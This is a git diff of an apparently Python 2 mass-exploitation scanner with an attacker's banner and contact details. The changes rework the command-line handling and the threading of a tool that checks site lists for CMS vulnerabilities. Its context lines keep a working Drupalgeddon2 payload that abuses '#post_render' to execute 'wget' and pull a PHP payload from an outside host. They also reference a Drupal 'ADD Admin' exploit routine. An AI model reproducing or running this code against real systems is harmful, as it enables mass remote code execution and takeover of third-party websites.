@@ -5,11 +5,6 @@ import requests
 import re
 from multiprocessing import Pool
 from multiprocessing.dummy import Pool as ThreadPool
-def clear():
-    if os.name == 'nt':
-        os.system('cls')
-    else:
-        os.system('clear')
 logo = """
    _____       _               _       ____   ____ _______  __      ____ 
   / ____|     | |             ( )     |  _ \ / __ \__   __| \ \    / /_ |
@@ -21,8 +16,10 @@ logo = """
                                                         fallagkill3r@gmail.com
                                                         https://www.facebook.com/drwxxrxrx   
 """
-requests.urllib3.disable_warnings()
 #results
+print logo
+print "Usage : MultiThread : "+sys.argv[0]+" -t thteads -u lists"
+print "Usage : SingleThread : "+sys.argv[0]+" -u lists"
 if not os.path.exists("results"):
     os.mkdir("results", 0755);
 if not os.path.exists("tmp"):
@@ -1020,7 +1017,7 @@ def drupal(site):
     except:
         print color.RED+"[Drupal ADD Admin]-Not Vulun"
         pass
-requests.urllib3.disable_warnings()
+
 payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
 headers = {'User-Agent': 'Mozilla 5.0'}
 def drugeddon(u):
@@ -1152,18 +1149,17 @@ def check(site):
     except :
         pass
 site = []
-def normal():
-    lista = raw_input('[+] Enter List Name : ')
+def clear():
+	if os.name == 'nt':
+		os.system('cls')
+	else:
+		os.system('clear')
+def normal(lista):
     file = open(lista).readlines()
     if (len(file) > 0):
         for zeb in file:
             nouna = zeb.rstrip()
             check(nouna)
-def clear():
-    if os.name == 'nt':
-        os.system('cls')
-    else:
-        os.system('clear')
 
 class color:
    PURPLE = '\033[95m'
@@ -1177,25 +1173,23 @@ class color:
    UNDERLINE = '\033[4m'
    END = '\033[0m'
 clear()
-def banner():
-    print color.BOLD+logo
-    print color.BOLD+"[1]MultiThread Scan"
-    print color.BOLD+"[2]SingleThread Scan"
-    ch = raw_input(">")
-    if ch == '1':
-        print "usage : python "+sys.argv[0]+" list.txt"
-    if ch == '2':
-        normal()
-banner()
 try:
-    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
+    target = [i.strip() for i in open(sys.argv[4], mode='r').readlines()]
 except IndexError:
     pass
-if len(sys.argv) == 2:
-    try : 
-        mp = Pool(150)
-        mp.map(check, target)
-        mp.close()
-        mp.join()
-    except :
-        pass
+if '-t' in sys.argv :
+	try : 
+		mp = Pool(int(sys.argv[2]))
+		mp.map(check, target)
+		mp.close()
+		mp.join()
+	except :
+		pass
+elif '-u' in sys.argv :
+	normal(sys.argv[2])
+else:
+	print logo
+	print "Usage : MultiThread : "+sys.argv[0]+" -t thteads -u lists"
+	print "Usage : SingleThread : "+sys.argv[0]+" -u lists"
+
+
